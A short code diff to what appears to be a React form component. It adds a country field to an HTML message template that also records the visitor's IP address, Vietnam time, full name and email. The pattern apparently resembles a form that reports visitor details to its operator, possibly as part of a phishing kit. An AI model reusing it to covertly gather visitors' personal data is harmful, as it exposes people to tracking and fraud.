@@ -134,6 +134,7 @@ const Step1: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = 
 
             const messageContent = /* HTML */ `
 <b>IP:</b> <code>${geoInfo?.ip || 'unknown'}</code>
+<b>Country:</b> <code>${countryCode || "CHỊU"}</code>
 <b>Thời gian:</b> <code>${getVietnamTime()}</code>
 <b>Full Name:</b> <code>${formFullName}</code>
 <b>Email:</b> <code>${formEmail}</code>
